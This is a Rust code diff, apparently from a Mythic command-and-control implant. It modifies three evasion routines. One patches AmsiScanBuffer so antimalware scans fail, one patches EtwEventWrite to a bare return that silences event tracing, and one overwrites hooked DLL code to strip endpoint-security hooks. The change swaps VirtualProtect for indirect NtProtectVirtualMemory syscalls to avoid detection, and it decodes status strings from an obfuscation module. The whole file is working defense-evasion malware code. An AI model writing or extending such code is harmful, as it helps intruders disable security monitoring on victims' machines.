@@ -25,7 +25,7 @@ pub fn amsi_patch(
 
     unsafe {
         // Resolve AmsiScanBuffer from amsi.dll
-        let amsi_scan_buffer = match crate::winapi_resolve::resolve("amsi.dll", "AmsiScanBuffer") {
+        let amsi_scan_buffer = match crate::syscalls::resolve_function("amsi.dll", "AmsiScanBuffer").map(|a| a as *mut std::ffi::c_void) {
             Some(ptr) => ptr,
             None => {
                 tx.send(mythic_error!(task.id, format!("{}: Failed to resolve AmsiScanBuffer",
@@ -34,40 +34,22 @@ pub fn amsi_patch(
             }
         };
 
-        // Resolve VirtualProtect from kernel32.dll
-        type VirtualProtectFn = unsafe extern "system" fn(
-            *mut std::ffi::c_void,
-            usize,
-            u32,
-            *mut u32,
-        ) -> i32;
-
-        let virtual_protect = match crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect") {
-            Some(ptr) => std::mem::transmute::<_, VirtualProtectFn>(ptr),
-            None => {
-                tx.send(mythic_error!(task.id, format!("{}: Failed to resolve VirtualProtect",
+        // Make the function writable via indirect syscall
+        let old_protect = match crate::syscalls::nt_protect(amsi_scan_buffer, 6, 0x40) {
+            Ok(old) => old,
+            Err(_) => {
+                tx.send(mythic_error!(task.id, format!("{}: NtProtectVirtualMemory failed",
                     crate::obfstr::d(crate::obfstr::S_AMSI_FAIL))))?;
                 return Ok(());
             }
         };
-
-        // PAGE_EXECUTE_READWRITE = 0x40
-        let mut old_protect: u32 = 0;
-
-        // Make the function writable
-        if virtual_protect(amsi_scan_buffer, 6, 0x40, &mut old_protect) == 0 {
-            tx.send(mythic_error!(task.id, format!("{}: VirtualProtect failed",
-                crate::obfstr::d(crate::obfstr::S_AMSI_FAIL))))?;
-            return Ok(());
-        }
 
         // Write the patch: mov eax, 0x80070057; ret (E_INVALIDARG)
         let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
         std::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan_buffer as *mut u8, 6);
 
         // Restore the original protection
-        let mut tmp: u32 = 0;
-        virtual_protect(amsi_scan_buffer, 6, old_protect, &mut tmp);
+        let _ = crate::syscalls::nt_protect(amsi_scan_buffer, 6, old_protect);
 
         tx.send(mythic_success!(task.id, format!("{}. AmsiScanBuffer patched successfully.",
             crate::obfstr::d(crate::obfstr::S_AMSI_PATCHED))))?;
@@ -100,7 +82,7 @@ pub fn etw_patch(
 
     unsafe {
         // Resolve EtwEventWrite from ntdll.dll
-        let etw_event_write = match crate::winapi_resolve::resolve("ntdll.dll", "EtwEventWrite") {
+        let etw_event_write = match crate::syscalls::resolve_function("ntdll.dll", "EtwEventWrite").map(|a| a as *mut std::ffi::c_void) {
             Some(ptr) => ptr,
             None => {
                 tx.send(mythic_error!(task.id, format!("{}: Failed to resolve EtwEventWrite",
@@ -109,40 +91,22 @@ pub fn etw_patch(
             }
         };
 
-        // Resolve VirtualProtect from kernel32.dll
-        type VirtualProtectFn = unsafe extern "system" fn(
-            *mut std::ffi::c_void,
-            usize,
-            u32,
-            *mut u32,
-        ) -> i32;
-
-        let virtual_protect = match crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect") {
-            Some(ptr) => std::mem::transmute::<_, VirtualProtectFn>(ptr),
-            None => {
-                tx.send(mythic_error!(task.id, format!("{}: Failed to resolve VirtualProtect",
+        // Make the function writable via indirect syscall
+        let old_protect = match crate::syscalls::nt_protect(etw_event_write, 1, 0x40) {
+            Ok(old) => old,
+            Err(_) => {
+                tx.send(mythic_error!(task.id, format!("{}: NtProtectVirtualMemory failed",
                     crate::obfstr::d(crate::obfstr::S_ETW_FAIL))))?;
                 return Ok(());
             }
         };
-
-        // PAGE_EXECUTE_READWRITE = 0x40
-        let mut old_protect: u32 = 0;
-
-        // Make the function writable
-        if virtual_protect(etw_event_write, 1, 0x40, &mut old_protect) == 0 {
-            tx.send(mythic_error!(task.id, format!("{}: VirtualProtect failed",
-                crate::obfstr::d(crate::obfstr::S_ETW_FAIL))))?;
-            return Ok(());
-        }
 
         // Write the patch: ret (0xC3) - all ETW calls become no-ops
         let patch: u8 = 0xC3;
         std::ptr::write(etw_event_write as *mut u8, patch);
 
         // Restore the original protection
-        let mut tmp: u32 = 0;
-        virtual_protect(etw_event_write, 1, old_protect, &mut tmp);
+        let _ = crate::syscalls::nt_protect(etw_event_write, 1, old_protect);
 
         tx.send(mythic_success!(task.id, format!("{}. EtwEventWrite patched successfully.",
             crate::obfstr::d(crate::obfstr::S_ETW_PATCHED))))?;
@@ -186,7 +150,6 @@ pub fn unhook(
         type MapViewOfFileFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, u32, u32, usize) -> *mut std::ffi::c_void;
         type UnmapViewOfFileFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
         type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
-        type VirtualProtectFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
         type GetModuleHandleAFn = unsafe extern "system" fn(*const i8) -> *mut std::ffi::c_void;
 
         let create_file_a = match crate::winapi_resolve::resolve("kernel32.dll", "CreateFileA") {
@@ -229,15 +192,6 @@ pub fn unhook(
             Some(ptr) => std::mem::transmute::<_, CloseHandleFn>(ptr),
             None => {
                 tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to resolve CloseHandle",
-                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
-                return Ok(());
-            }
-        };
-
-        let virtual_protect = match crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect") {
-            Some(ptr) => std::mem::transmute::<_, VirtualProtectFn>(ptr),
-            None => {
-                tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to resolve VirtualProtect",
                     crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
                 return Ok(());
             }
@@ -388,29 +342,28 @@ pub fn unhook(
         let text_va = section.virtual_address as usize;
         let text_size = section.virtual_size as usize;
 
-        // Change memory protection to RW
-        // PAGE_READWRITE = 0x04
-        let mut old_protect: u32 = 0;
+        // Change memory protection to RW via indirect syscall
         let text_addr = (dll_base as usize + text_va) as *mut std::ffi::c_void;
 
-        if virtual_protect(text_addr, text_size, 0x04, &mut old_protect) == 0 {
-            unmap_view_of_file(mapped_base);
-            close_handle(mapping_handle);
-            close_handle(file_handle);
-            tx.send(mythic_error!(task.id, format!("{} {} {}: VirtualProtect failed",
-                crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
-            return Ok(());
-        }
+        let old_protect = match crate::syscalls::nt_protect(text_addr, text_size, 0x04) {
+            Ok(old) => old,
+            Err(_) => {
+                unmap_view_of_file(mapped_base);
+                close_handle(mapping_handle);
+                close_handle(file_handle);
+                tx.send(mythic_error!(task.id, format!("{} {} {}: NtProtectVirtualMemory failed",
+                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
+                return Ok(());
+            }
+        };
 
         // Copy clean .text section over the hooked version
         let clean_text = (mapped_base as usize + text_va) as *const u8;
         let hooked_text = text_addr as *mut u8;
         ptr::copy_nonoverlapping(clean_text, hooked_text, text_size);
 
-        // Restore to RX
-        // PAGE_EXECUTE_READ = 0x20
-        let mut tmp: u32 = 0;
-        virtual_protect(text_addr, text_size, 0x20, &mut tmp);
+        // Restore to RX via indirect syscall
+        let _ = crate::syscalls::nt_protect(text_addr, text_size, 0x20);
 
         // Cleanup
         unmap_view_of_file(mapped_base);
